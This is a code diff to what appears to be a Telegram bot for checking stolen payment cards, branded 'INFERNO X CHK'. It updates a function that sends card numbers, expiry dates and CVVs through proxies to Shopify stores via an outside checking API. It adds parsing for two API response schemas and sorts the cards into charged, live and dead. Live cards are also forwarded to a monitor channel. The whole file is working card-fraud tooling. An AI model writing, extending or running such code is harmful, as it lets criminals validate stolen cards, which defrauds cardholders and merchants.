@@ -58,8 +58,6 @@ from video_helpers import send_random_video
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # MONITOR SINK IMPORT — lazy, from __main__ to dodge cycle
-# main.py may be imported under a different name in some layouts.
-# The helper below resolves it robustly.
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def _get_forward_to_monitor():
     try:
@@ -534,7 +532,17 @@ def get_user_display(user_obj, plan_name):
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # API PROCESSING FUNCTION (Multi-API with auto-failover)
+# Handles BOTH schemas:
+#   OLD: {"Gateway": ..., "Currency": ..., "Status": true, "Price": "0.00"}
+#   NEW: {"Gate": ..., "Charged": "True"/"False", "Approved": "True"/"False", "Price": "18.98 USD"}
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def _truthy(v) -> bool:
+    if v is True:
+        return True
+    if v is False or v is None:
+        return False
+    return str(v).strip().lower() in ("true", "1", "yes", "y")
 
 async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, proxy: str) -> Tuple[bool, str, str, str, str, str, str, int]:
     import urllib.parse
@@ -579,22 +587,63 @@ async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, pro
                 if response.status == 200:
                     try:
                         data = await response.json()
-                        gateway = str(data.get("Gateway", "Shopify Payments"))
-                        price = str(data.get("Price", "0.00"))
-                        currency = data.get("Currency", "USD")
+
+                        # ━━ SCHEMA-AWARE ━━
+                        gateway = str(data.get("Gate") or data.get("Gateway") or "Shopify Payments")
+
+                        raw_price = str(data.get("Price", "0.00"))
+                        price_match = re.match(r'^\s*([\d.]+)\s*([A-Za-z]{3})?\s*$', raw_price)
+                        if price_match:
+                            price = price_match.group(1) or "0.00"
+                            inferred_currency = price_match.group(2)
+                        else:
+                            price = re.sub(r'[^\d.]', '', raw_price) or "0.00"
+                            inferred_currency = None
+
+                        currency = data.get("Currency") or inferred_currency or "USD"
+
                         proxy_raw = data.get("Proxy", "Dead")
                         api_response = str(data.get("Response", "Unknown Error"))
                         api_response = safe_html(api_response)
-                        status_raw = data.get("Status", "false")
 
-                        success = status_raw is True or str(status_raw).lower() == "true"
-                        proxy_status = "Live" if "live" in str(proxy_raw).lower() or status_raw is True or str(status_raw).lower() == "true" else "Dead"
+                        status_raw = data.get("Status")
+                        charged_raw = data.get("Charged")
+                        approved_raw = data.get("Approved")
+
+                        # success = Charged first (new schema), then Status (old), then Approved
+                        if charged_raw is not None:
+                            success = _truthy(charged_raw)
+                        elif status_raw is not None:
+                            success = _truthy(status_raw)
+                        else:
+                            success = _truthy(approved_raw)
+
+                        # proxy live signal
+                        is_proxy_live = (
+                            _truthy(charged_raw) or
+                            _truthy(approved_raw) or
+                            "live" in str(proxy_raw).lower()
+                        )
+                        proxy_status = "Live" if is_proxy_live else "Dead"
 
                         mark_api_success(api_url_base)
 
                         msg_upper = api_response.upper()
-                        if any(k in msg_upper for k in ["ORDER PAID", "ORDER_PAID", "ORDER_PLACED", "CHARGED", "3DS", "OTP", "INSUFFICIENT", "DECLINED", "INVALID", "EXPIRED", "CVC", "THANK YOU", "FRAUD", "STOLEN", "LOST", "APPROVED", "DO NOT HONOR", "CARD_DECLINED"]):
-                            return (success, api_response, current_site, gateway, price, currency, proxy_status, http_status)
+
+                        # CHARGED — explicit flag OR paid keywords
+                        if _truthy(charged_raw) or any(k in msg_upper for k in
+                                ["ORDER PAID", "ORDER_PAID", "ORDER_PLACED", "CHARGED", "PAYMENT_SUCCESS", "THANK YOU"]):
+                            return (True, api_response, current_site, gateway, price, currency, proxy_status, http_status)
+
+                        # LIVE / APPROVED — explicit approved, or 3DS/OTP/INSUFFICIENT/INVALID_CVC
+                        if _truthy(approved_raw) or any(k in msg_upper for k in
+                                ["APPROVED", "3DS", "DS_REQUIRED", "OTP", "INSUFFICIENT", "INVALID_CVC", "INCORRECT_CVC"]):
+                            return (False, api_response, current_site, gateway, price, currency, proxy_status, http_status)
+
+                        # DEAD — decline keywords
+                        if any(k in msg_upper for k in
+                                ["CARD_DECLINED", "DECLINED", "DO NOT HONOR", "DO_NOT_HONOR", "FRAUD", "STOLEN", "LOST", "EXPIRED"]):
+                            return (False, api_response, current_site, gateway, price, currency, proxy_status, http_status)
 
                         last_result = (success, api_response, current_site, gateway, price, currency, proxy_status, http_status)
 
@@ -647,7 +696,7 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
     plan_name_clean = re.sub(r'<[^>]+>', '', plan_name)
     user_display = get_user_display(user_obj, plan_name_clean)
 
-    lines = ["━" * 32, f"           𝑰𝑵𝑭𝑬𝑹𝑵𝑶 𝑿 𝑪𝑯𝑲", "━" * 32, "", f"Result Type → {type_label} {type_emoji}", f"Total Cards → {total_count}", f"Gateway → Shopify Mass", f"Powered By → 𝗫𝗖𝗢𝗡 ★ 𝗫𝟯", "━" * 32, ""]
+    lines = ["━" * 32, f"           𝑰𝑵𝑭𝑬𝑹𝑵𝑶 𝑿 𝑪𝑯𝑲", "━" * 32, "", f"Result Type → {type_label} {type_emoji}", f"Total Cards → {total_count}", f"Gateway → Shopify Mass", f"Powered By → 𝑰𝑵𝑭𝑬𝑹𝑵𝑶 𝑿 𝑪𝑯𝑲", "━" * 32, ""]
 
     if total_count == 0:
         lines.append("No cards found for this category")
@@ -1021,14 +1070,22 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             message_upper = message.upper()
             message_lower = message.lower()
 
-            if success and message_upper.strip() in ("ORDER_PLACED", "ORDER_PAID"):
+            # CHARGED takes priority — success flag from Charged/Status field
+            if success:
                 result_status = "CHARGED"
                 response_msg = safe_html(message)
                 break
-            elif ("3DS_REQUIRED" in message_upper or "INSUFFICIENT_FUND" in message_upper or "DS_REQUIRED" in message_upper or "INVALID_CVC" in message_upper or "OTP_REQUIRED" in message_upper):
+            # Explicit charged keywords without the flag
+            elif message_upper.strip() in ("ORDER_PLACED", "ORDER_PAID"):
+                result_status = "CHARGED"
+                response_msg = safe_html(message)
+                break
+            # LIVE / APPROVED
+            elif ("3DS_REQUIRED" in message_upper or "INSUFFICIENT_FUND" in message_upper or "DS_REQUIRED" in message_upper or "INVALID_CVC" in message_upper or "OTP_REQUIRED" in message_upper or "APPROVED" in message_upper):
                 result_status = "APPROVED"
                 response_msg = safe_html(message)
                 break
+            # DEAD
             elif ("CARD_DECLINED" in message_upper or "DECLINED" in message_upper or "DO_NOT_HONOR" in message_upper or any(d in message_upper for d in DECLINED_RESPONSES)):
                 result_status = "DEAD"
                 response_msg = "CARD_DECLINED"
@@ -1101,7 +1158,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             send_approved_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name, currency),
             _monitor_forward(bot, gate="Shopify Mass (MSH)", status="LIVE", card=cc_formatted, site=url if 'url' in locals() else "", amount=f"{api_price} {currency}", extra=response_msg, user_obj=user_obj),
         )
-        # insufficient funds counts as LIVE for user, but should also be flagged separately
         if "INSUFFICIENT" in (response_msg or "").upper():
             await _monitor_forward(bot, gate="Shopify Mass (MSH)", status="INSUFFICIENT", card=cc_formatted, site=url if 'url' in locals() else "", amount=f"{api_price} {currency}", extra=response_msg, user_obj=user_obj)
     elif result_status == "DEAD":
